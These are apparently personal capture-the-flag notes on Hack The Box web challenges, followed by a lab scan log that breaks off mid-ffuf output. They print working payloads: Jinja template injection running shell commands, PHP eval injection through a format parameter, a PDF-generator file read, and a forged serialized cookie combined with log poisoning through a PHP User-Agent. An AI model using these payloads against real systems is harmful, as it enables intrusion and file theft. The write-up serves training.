# blinker fluids htb


examining the code we can see in the docker file

```
# Add flag
COPY flag.txt /flag.txt
```
and we see a fake flag for testing as well.

while creating pdf we see

```
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 

```
https://heinandre.no/htb-cyber-apocalypse-2022/web/blinker-fluids/

first we look at the databases and imports.
we see any templating engine then we can try and inject.

while trying iframe injection I was able to inject an iframe but no flag text file still.


```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt')}"; display: block }`,
}
---

```
HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}

# templated htb

when we go to http://159.65.58.189:31882/

we can see that site is still under construction and uses jinja templates

so straight away template injection comes to mind.

but need to run dirbuster to get to any good sites.

https://ireadyoulearn.info/2021/06/19/server-side-template-injection-hack-the-box-walkthrough/

trying with /config

```
Error 404

The page '<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>' could not be found
```

```
{{''.__class__.__mro__[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}

# phonebook

after doing passwird bruteforcing it worked.

# gunship

while looking at the code I could see the line 

`pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })`

maybe if instead of 'guest we can put something else?

AST injection was the original hint in one of the comments in the machine

looking at AST injection

# sanitize

sql injection in 
HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}

# Lovetok

the time changes everytime hte page is refreshed

we see inside entrypoint.sh

`FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
`
will give out random numbers

```
~/Downloads/web_lovetok ⌚ 13:03:55
$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1

Sz0Ir

```

The website handles all request path

function for time

```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

Eval is the vulnerability, however you see the addslashes. looking at the net for addslashes we found.

?format=${phpinfo()} if we add to the url it works

you can enumerate th edirectory by : http://206.189.20.127:31160/?format=${system($_GET[1])}&1=ls+/

th flag will be at : http://157.245.33.77:32397/?format=${system($_GET[1])}&1=cat+flagwGg4C

not getting flags anymore though
https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/

# TOXIC

The entire structure is similar to lovetok.

The page itself is static.

in index.php we find

```php
<?php

spl_autoload_register(function ($name){

    if (preg_match('/Model$/', $name))

    {

        $name = "models/${name}";

    }

    include_once "${name}.php";

});



if (empty($_COOKIE['PHPSESSID']))

{

    $page = new PageModel;

    $page->file = '/www/index.html';



    setcookie(

        'PHPSESSID', 

        base64_encode(serialize($page)), 

        time()+60*60*24, 

        '/'

    );

} 



$cookie = base64_decode($_COOKIE['PHPSESSID']);

unserialize($cookie);


```

and in page model

```php
<?php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

the page handle anything

I can see it makes a phpssied cookie though

can we make it load malicous cookie?

```
PHPSESSID:"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"
```

after decoding it we found

O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

now we can put in any page inside it

Request sent to get /var/log/nginx/access.log

request:

```
GET /? HTTP/1.1


Host: 134.209.17.29:32259


User-Agent: <?php system('ls /');?>


Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8


Accept-Language: en-US,en;q=0.5


Accept-Encoding: gzip, deflate


DNT: 1


Connection: close


Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==


Upgrade-Insecure-Requests: 1


Cache-Control: max-age=0



```


output: 

```
HTTP/1.1 200 OK

Server: nginx

Date: Wed, 13 Jul 2022 18:00:57 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

X-Powered-By: PHP/7.4.15

Content-Length: 5698



134.209.17.29 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/css/production.css HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/js/production.js HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/flask.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/bucket.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/facebook.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/twitter.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/youtube.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/aircraft.svg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan2.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/dart-frog.jpg HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan5.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan3.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan1.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan4.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/ryan6.png HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/favicon.ico HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET / HTTP/1.1" "http://134.209.17.29:32259/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/js/production.js HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /asdsf HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/facebook.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/twitter.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /static/images/instagram.svg HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /favicon.ico HTTP/1.1" "http://134.209.17.29:32259/?format=r" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
134.209.17.29 - 200 "GET /?format=r HTTP/1.1" "-" "bin
dev
entrypoint.sh
etc
flag_Wqgfs
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
" 
```


O:9:"PageModel":1:{s:4:"file";s:25:"/flag_Wqgfs";}

and add the user agent as :

<?php system('cat flag_Wqgfs');?>

HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}



# petpetrcbee challenge

```
https://shakuganz.com/2021/06/11/hackthebox-petpet-rcbee-write-up/
```

# cyberwarfare lab

# machine 1

parameter manipulation

http://34.143.185.200:3000/signup/index.php

```
 sudo ./nmap_automator.sh -H 34.143.185.200 -t All
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 

Running all scans on 34.143.185.200

Host is likely running Unknown OS!
                                                                             
                                                                             
---------------------Starting Port Scan-----------------------               
                                                                             


PORT     STATE SERVICE
22/tcp   open  ssh
1720/tcp open  h323q931
3000/tcp open  ppp



---------------------Starting Script Scan-----------------------
                                                                             


PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8c6bba0da6b3bf7cbef568b6a72f9583 (RSA)
|   256 b1abbd1e51f4103d9b81798bd9a7a6e5 (ECDSA)
|_  256 137f967f676c80531bbc0084c9ca6e7e (ED25519)
1720/tcp open  h323q931?
3000/tcp open  http      Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Food Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



OS Detection modified to: Linux
                                                                             



---------------------Starting Full Scan------------------------
                                                                             


PORT     STATE SERVICE
22/tcp   open  ssh
1720/tcp open  h323q931
3000/tcp open  ppp



No new ports
                                                                             



----------------------Starting UDP Scan------------------------
                                                                             




No UDP ports are open
                                                                             



---------------------Starting Vulns Scan-----------------------
                                                                             
Running CVE scan on all ports
                                                                             


PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227   *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937     *EXPLOIT*
1720/tcp open  h323q931?
3000/tcp open  http      Apache httpd 2.4.38 ((Debian))
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631   *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193  *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427     *EXPLOIT*
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882     *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676  *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502     *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441   *EXPLOIT*
|_      5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    0.0     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9       *EXPLOIT*
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



Running Vuln scan on all ports
This may take a while, depending on the number of detected services..        
                                                                             


PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516  *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193  *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328     *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009     *EXPLOIT*
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621   *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939  *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730     *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227   *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937     *EXPLOIT*
1720/tcp open  h323q931?
3000/tcp open  http      Apache httpd 2.4.38 ((Debian))
| http-enum: 
|_  /login/: Login page
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=200.185.143.34.bc.googleusercontent.com
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://200.185.143.34.bc.googleusercontent.com:3000/login/index.php
|     Form id: 
|     Form action: ./index.php
|     
|     Path: http://200.185.143.34.bc.googleusercontent.com:3000/signup/index.php
|     Form id: 
|_    Form action: ./index.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631   *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193  *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427     *EXPLOIT*
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882     *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676  *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502     *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8       *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2       *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332       *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B       *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE       *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577     *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D       *EXPLOIT*
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422     *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575     *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441   *EXPLOIT*
|       CVE-2023-27522  0.0     https://vulners.com/cve/CVE-2023-27522
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
|_      5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    0.0     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9       *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




---------------------Recon Recommendations---------------------
                                                                             

Web Servers Recon:
                                                                             
nikto -host "http://34.143.185.200:3000" | tee "recon/nikto_34.143.185.200_3000.txt"
ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '.html FFUFHASH : cdfe14 ' -u "http://34.143.185.200:3000/FUZZ" | tee "recon/ffuf_34.143.185.200_3000.txt"





Which commands would you like to run?                                        
All (Default), ffuf, nikto, Skip <!>

Running Default in (1)s: 


---------------------Running Recon Commands--------------------
                                                                             

Starting nikto scan
                                                                             
- Nikto v2.5.0
---------------------------------------------------------------------------
---------------------------------------------------------------------------
+ 0 host(s) tested

Finished nikto scan
                                                                             
=========================
                                                                             
Starting ffuf scan
                                                                             

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://34.143.185.200:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html FFUFHASH : cdfe14  
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

